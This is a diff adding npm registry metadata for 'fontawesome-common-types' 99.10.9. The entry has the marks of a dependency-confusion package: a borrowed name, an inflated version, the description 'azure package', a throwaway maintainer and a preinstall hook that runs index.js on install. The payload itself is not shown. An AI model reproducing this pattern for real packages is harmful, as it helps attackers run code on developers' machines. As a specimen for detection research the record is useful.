@@ -1,0 +1,62 @@
+{
+    "_id": "fontawesome-common-types",
+    "name": "fontawesome-common-types",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "fontawesome-common-types",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "fontawesome-common-types@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-YA87XmC/DW60XX+tyqzVm8fj9JjlrTWAO5HwpLfp7NXdokfx0xFtrLhRYUiOgf7a2n87e6iwWEaYRa0BsfAfTg==",
+                "shasum": "3e31ca8d383a065b8067366cb70b82450ee5857b",
+                "tarball": "https://registry.npmjs.org/fontawesome-common-types/-/fontawesome-common-types-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5076,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOwv5ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoSShAAic+hg1KSO4tRqftQa6s1+YYp255VSQHKbtF1si4C5fubBFgE\r\nR+HS8ICZ1m2t+CsGLJfjboD+NWf3Ir4aognGxO+vKDms5MQccVoG1IqZ9KSw\r\nptrZPk1F6nSudxiqedqJ2ddJ8TsxAnLLJh87c8yPSKycaqrm42NT9AVcvSA3\r\nrVZaNqIzY5uh/JVUmFbd6z3OhZn3Vswhi/HUYB2UjOMr/x08DXdhabUMBypw\r\nsdygnIzUJT4K7Ew6TDiZJ6qukckXbuD5qTqayhDfz4JiJRxZfAmofn49X7VO\r\nf6EKoirDM4mQ8p3gw/oAYyi5H6lQzPhnsUXYVToZ+ILJI8PKHoDWYG9pZTFX\r\n//7a3oudhJxTAFSXb2jz1g8wX3EnAVp6OB2hfHjvsj0opeLMXtF+ATgUwwPq\r\n2sHNa4datQnfD2/7DF56rj1sc05JZn2RIMuqhztMA7KXVtgQAtJ3H7vZH6LR\r\nHJ6RVGafnVTRZ6v7jK48Dr013S2psLD8AfADoCRBSfpbyS4QsvSNbFI6qdit\r\nX7H91voKXlMP5OdzNJp787AkE1X0kviJh4SAXvLnCScj1VcdVREM/tOQABDH\r\nxzIWaUdAimPQzp+Z3EisU7xir60Ed9tvgcZGO9HiZBWRA+KDIJ20UJ+dxrRp\r\n2Mu+JwV2guvYhhM6G3JXpbsVWbaMz3VkUCk=\r\n=4aAg\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "nlep1occ",
+                "email": "nlep1occ@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "nlep1occ",
+                    "email": "nlep1occ@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/fontawesome-common-types_99.10.9_1648036856881_0.2733449842717024"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T12:00:56.880Z",
+        "99.10.9": "2022-03-23T12:00:57.047Z",
+        "modified": "2022-03-23T12:00:57.137Z"
+    },
+    "maintainers": [
+        {
+            "name": "nlep1occ",
+            "email": "nlep1occ@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
